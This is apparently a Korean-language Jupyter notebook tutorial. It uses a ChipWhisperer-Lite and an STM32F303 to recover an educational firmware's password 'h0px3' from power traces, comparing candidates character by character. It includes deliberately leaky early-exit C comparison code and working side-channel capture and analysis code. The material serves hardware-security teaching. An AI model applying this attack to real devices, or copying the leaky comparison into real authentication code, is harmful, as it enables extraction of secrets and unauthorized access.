# 01. 전력으로 비밀번호 깨기

같은 펌웨어에 입력 한 글자만 다르게 넣었습니다. 그런데 실제 전력 파형은 달라집니다. 그 차이만 사용해 교육용 금고의 비밀번호 `h0px3`를 복구해 보겠습니다.

이 노트북을 실행할 때 STM32F303과 ChipWhisperer-Lite에서 후보 185개를 직접 측정합니다. 시작 셀은 target 플래시를 지우고 번들 비밀번호 펌웨어를 기록합니다. 이전 측정에서 약 37초가 걸렸습니다.

In [ ]:
import chipwhisperer as cw
import json
import matplotlib.pyplot as plt
import numpy as np

from cw_sca_tutorial.demo import repository_root
from cw_sca_tutorial.hardware import capture_password_run

ROOT = repository_root()
devices = cw.list_devices()
assert len(devices) == 1, f"Expected one ChipWhisperer, found: {devices}"
run = capture_password_run(
    ROOT / "firmware/prebuilt/basic-passwdcheck-CWLITEARM.hex",
    repeats=1,
    gain_db=25.0,
    runs_root=ROOT / "runs",
    serial_number=devices[0]["sn"],
    platform_name="CWLITEARM",
    target_identification="STM32F303",
)
metadata = json.loads((run / "metadata.json").read_text())
data = np.load(run / "traces.npz")

traces = data["traces"]
guesses = data["guesses"]
positions = data["positions"]
kinds = data["kinds"]

print("DATA SOURCE : MEASURED")
print("RUN         :", run.name)
print("TARGET      :", metadata["target_identity"]["user_identification"])
print("SCOPE       :", metadata["measurement_setup"]["device"]["name"])
print("TRACES      :", traces.shape)

## 입력 한 글자가 만든 차이

`a`는 첫 비교에서 바로 틀립니다. `h`는 첫 글자가 맞아서 다음 글자까지 비교합니다. 왼쪽에서는 전체 파형을 겹쳐 보고, 오른쪽에서는 차이가 가장 큰 구간을 확대합니다.

In [ ]:
first_position = positions == 0
reference = traces[first_position & (kinds == "reference")][0]
trace_a = traces[first_position & (kinds == "candidate") & (guesses == "a")][0]
trace_h = traces[first_position & (kinds == "candidate") & (guesses == "h")][0]

difference = np.abs(trace_h - reference)
window = 120
rolling = np.convolve(difference, np.ones(window), mode="valid")
start = int(np.argmax(rolling))
zoom = slice(max(0, start - 80), min(len(reference), start + window + 80))

fig, axes = plt.subplots(1, 2, figsize=(15, 4))
axes[0].plot(reference, label="Invalid reference", alpha=.8)
axes[0].plot(trace_a, label="Candidate a", alpha=.8)
axes[0].plot(trace_h, label="Candidate h", linewidth=1.5)
axes[0].set(title="Measured password traces", xlabel="Sample", ylabel="ADC count")
axes[0].legend()
axes[1].plot(np.arange(len(reference))[zoom], trace_h[zoom] - reference[zoom], label="h - reference")
axes[1].plot(np.arange(len(reference))[zoom], trace_a[zoom] - reference[zoom], label="a - reference", alpha=.8)
axes[1].axhline(0, color="black", linewidth=.7)
axes[1].set(title="Largest difference window", xlabel="Sample", ylabel="ADC difference")
axes[1].legend()
plt.show()

## 왜 다음 비교로 넘어갈까요?

펌웨어는 앞에서부터 문자를 비교하고 첫 불일치에서 멈춥니다.

```c
for (i = 0; i < sizeof(correct_passwd); i++) {
    if (correct_passwd[i] != passwd[i]) {
        break;
    }
}
```

맞는 접두사가 길수록 비교 루프를 더 오래 실행합니다. 이 실행 경로 차이가 전력 파형에 남습니다.

## 36개 후보 중 첫 글자 찾기

항상 틀리는 기준 파형과 각 후보 파형의 절댓값 차이 합(SAD)을 계산합니다. 점수가 가장 큰 후보가 다음 비교로 넘어간 문자입니다.

In [ ]:
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
first_scores = metadata["decisions"][0]["scores"]
score_values = np.array([first_scores[c] for c in alphabet])
best_index = int(np.argmax(score_values))

fig, ax = plt.subplots(figsize=(13, 4))
bars = ax.bar(list(alphabet), score_values, color="#4c78a8")
bars[best_index].set_color("#e45756")
ax.set(title=f"First character: {alphabet[best_index]}", xlabel="Candidate", ylabel="Full-trace SAD")
plt.show()

ranking = np.argsort(score_values)[::-1][:5]
for index in ranking:
    print(f"{alphabet[index]}: {score_values[index]:.0f}")

## 비밀번호 전체 복구

찾은 문자를 접두사에 붙이고 같은 과정을 다음 위치에서 반복합니다. 아래 셀은 저장된 원시 파형에서 SAD를 다시 계산해 선택 순서를 만듭니다.

In [ ]:
prefixes = []
score_rows = []
prefix = ""
for position in range(5):
    mask = positions == position
    reference = traces[mask & (kinds == "reference")].mean(axis=0)
    scores = []
    for candidate in alphabet:
        guess = prefix + candidate
        candidate_traces = traces[mask & (kinds == "candidate") & (guesses == guess)]
        assert len(candidate_traces) >= 1, (position, guess)
        scores.append(np.sum(np.abs(candidate_traces.mean(axis=0) - reference)))
    scores = np.asarray(scores)
    score_rows.append(scores)
    prefix += alphabet[int(np.argmax(scores))]
    prefixes.append(prefix)
    print(prefix)

assert prefixes[-1] == "h0px3"
assert prefixes == [decision["prefix"] for decision in metadata["decisions"]]

fig, ax = plt.subplots(figsize=(14, 4))
image = ax.imshow(np.stack(score_rows), aspect="auto", cmap="magma")
ax.set_xticks(range(len(alphabet)), list(alphabet))
ax.set_yticks(range(5), ["Position 1", "Position 2", "Position 3", "Position 4", "Position 5"])
ax.set(title="Measured password candidate scores", xlabel="Candidate")
fig.colorbar(image, ax=ax, label="SAD")
plt.show()